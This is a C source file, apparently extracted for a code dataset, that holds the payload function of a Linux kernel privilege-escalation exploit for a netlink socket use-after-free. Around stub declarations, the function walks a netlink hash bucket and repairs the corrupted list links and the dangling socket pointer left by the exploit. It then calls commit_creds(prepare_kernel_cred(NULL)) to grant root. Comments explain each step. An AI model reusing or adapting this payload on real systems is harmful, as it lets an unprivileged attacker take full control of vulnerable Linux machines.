#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_8__   TYPE_4__ ;
typedef  struct TYPE_7__   TYPE_3__ ;
typedef  struct TYPE_6__   TYPE_2__ ;
typedef  struct TYPE_5__   TYPE_1__ ;

/* Type definitions */
struct task_struct {TYPE_3__* files; } ;
struct socket {int /*<<< orphan*/ * sk; } ;
struct nl_pid_hash {int /*<<< orphan*/  entries; } ;
struct netlink_table {struct nl_pid_hash hash; } ;
struct hlist_node {struct hlist_node** pprev; struct hlist_node* next; } ;
struct hlist_head {struct hlist_node* first; } ;
struct TYPE_8__ {int /*<<< orphan*/  pid; } ;
struct TYPE_7__ {TYPE_2__* fdt; } ;
struct TYPE_6__ {TYPE_1__** fd; } ;
struct TYPE_5__ {struct socket* private_data; } ;

/* Variables and functions */
 scalar_t__ KMALLOC_TARGET ; 
 size_t NETLINK_USERSOCK ; 
 scalar_t__ NL_TABLE_ADDR ; 
 int /*<<< orphan*/  commit_creds (int /*<<< orphan*/ ) ; 
 TYPE_4__ g_target ; 
 struct task_struct* get_current (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  netlink_table_grab () ; 
 int /*<<< orphan*/  netlink_table_ungrab () ; 
 struct hlist_head* nl_pid_hashfn (struct nl_pid_hash*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  prepare_kernel_cred (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  restored_rsp ; 
 size_t unblock_fd ; 

__attribute__((used)) static void payload(void)
{
  struct task_struct *current = get_current(restored_rsp);
  struct socket *sock = current->files->fdt->fd[unblock_fd]->private_data;
  void *sk;

  sk = sock->sk; // keep it for list walking
  sock->sk = NULL; // fix the 'sk' dangling pointer

  // lock all hash tables
  netlink_table_grab();

  // retrieve NETLINK_USERSOCK's hash table
  struct netlink_table *nl_table = * (struct netlink_table**)NL_TABLE_ADDR; // deref it!
  struct nl_pid_hash *hash = &(nl_table[NETLINK_USERSOCK].hash);

  // retrieve the bucket list
  struct hlist_head *bucket = nl_pid_hashfn(hash, g_target.pid);

  // walk the bucket list
  struct hlist_node *cur;
  struct hlist_node **pprev = &bucket->first;
  for (cur = bucket->first; cur; pprev = &cur->next, cur = cur->next)
  {
    // is this our target ?
    if (cur == (struct hlist_node*)sk)
    {
      // fix the 'next' and 'pprev' field
      if (cur->next == (struct hlist_node*)KMALLOC_TARGET) // 'cmsg_len' value (reallocation)
        cur->next = NULL; // first scenario: was the last element in the list
      cur->pprev = pprev;

      // __hlist_del() operation (dangling pointers fix up)
      *(cur->pprev) = cur->next;
      if (cur->next)
        cur->next->pprev = pprev;

      hash->entries--; // make it clean

      // stop walking
      break;
    }
  }

  // release the lock
  netlink_table_ungrab();

  // privilege (de-)escalation
  commit_creds(prepare_kernel_cred(NULL));
}